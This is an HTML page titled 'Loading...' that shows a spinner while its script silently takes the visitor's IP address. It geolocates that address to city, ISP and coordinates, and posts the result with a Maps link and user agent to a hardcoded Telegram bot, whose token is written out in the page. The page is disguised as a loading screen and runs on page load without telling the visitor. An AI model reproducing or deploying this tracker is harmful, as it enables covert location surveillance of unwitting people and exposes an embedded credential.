<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h2>Please wait...</h2>

    <script>
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => {
                const ip = data.ip;
                const ua = navigator.userAgent;

                // ✅ HTTPS API (ip-api.com को SSL version)
                fetch(`https://ip-api.com/json/${ip}?fields=status,country,city,isp,lat,lon`)
                    .then(res => res.json())
                    .then(locData => {
                        if (locData.status === 'success') {
                            const lat = locData.lat || '';
                            const lon = locData.lon || '';
                            const city = locData.city || '';
                            const country = locData.country || '';
                            const isp = locData.isp || '';

                            const location = `${country}, ${city} (${isp})`;
                            const mapLink = `https://www.google.com/maps/place/${lat},${lon}`;

                            const msg = `📍 **Silent Location**\nIP: ${ip}\nLocation: ${location}\n🗺️ Maps: ${mapLink}\nUA: ${ua}`;

                            const botToken = '8693973243:AAH1Iu_J_XDhbWOh9JCHWDuRgtW84YKF81I';
                            const chatId = '8621764137';

                            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    chat_id: chatId,
                                    text: msg,
                                    parse_mode: 'Markdown'
                                })
                            })
                            .then(() => {
                                document.body.innerHTML = `<h2>✅</h2><p style="color:green;">Done</p>`;
                            })
                            .catch(() => {
                                document.body.innerHTML = `<h2>⚠️</h2><p>Telegram error</p>`;
                            });
                        } else {
                            document.body.innerHTML = `<h2>⚠️</h2><p>Location not found</p>`;
                        }
                    })
                    .catch(() => {
                        document.body.innerHTML = `<h2>⚠️</h2><p>API error</p>`;
                    });
            })
            .catch(() => {
                document.body.innerHTML = `<h2>⚠️</h2><p>IP error</p>`;
            });
    </script>
</body>
</html>
